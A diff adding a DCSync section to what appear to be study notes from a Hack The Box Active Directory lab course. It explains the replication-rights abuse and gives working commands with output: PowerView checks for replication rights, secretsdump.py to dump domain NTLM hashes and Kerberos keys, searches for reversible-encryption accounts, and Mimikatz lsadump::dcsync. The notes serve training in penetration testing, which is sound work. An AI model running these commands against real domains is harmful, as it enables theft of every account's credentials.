@@ -44,6 +44,8 @@
         - [Enumerating ACLs with PowerView](#enumerating-acls-with-powerview)
         - [Enumerating ACLs with BloodHound](#enumerating-acls-with-bloodhound)
     - [Abusing ACLs](#abusing-acls)
+    - [DCSync](#dcsync)
+
 
     
 
@@ -1431,3 +1433,120 @@ PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberNa
 
 
 ```
+
+### DCSync
+- We now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. 
+
+- DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data.
+- The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+
+> [!NOTE]
+> Domain/Enterprise Admins and default domain administrators have this right by default.
+
+- Viewing adunn's Replication Privileges through ADSI Edit ![adnunn_right_dcsync](/images/adnunn_right_dcsync.jpg)
+
+```powershell
+# Using Get-DomainUser to View adunn's Group Membership
+PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+
+samaccountname     : adunn
+objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
+memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
+                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+
+# Using Get-ObjectAcl to Check adunn's Replication Rights
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
+ObjectAceType         : DS-Replication-Get-Changes-All
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-All
+
+
+```
+
+
+- DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.
+- **Secretsdump.py**
+    ```bash
+    # Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
+    abdeonix@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+
+
+    ```
+    - We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user.
+
+    - Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history
+
+
+    - The `-user-status` is another helpful flag to check and see if a user is disabled.
+    - If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.
+    - When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent. 
+    - Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
+    ```powershell
+    # Enumerating Further using Get-ADUser
+    PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+    DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+    Enabled            : True
+    GivenName          :
+    Name               : PROXYAGENT
+    ObjectClass        : user
+    ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
+    SamAccountName     : proxyagent
+    SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
+    Surname            :
+    userAccountControl : 640
+    UserPrincipalName  :
+
+    # Checking for Reversible Encryption Option using Get-DomainUser
+    PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+    samaccountname                         useraccountcontrol
+    --------------                         ------------------
+    proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+
+    ```
+
+- **Using Mimikatz**
+    ```bat
+    # Using runas.exe
+    C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
+
+    # Performing the Attack with Mimikatz
+    PS C:\htb> .\mimikatz.exe
+    mimikatz # privilege::debug
+    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+    ```
+    
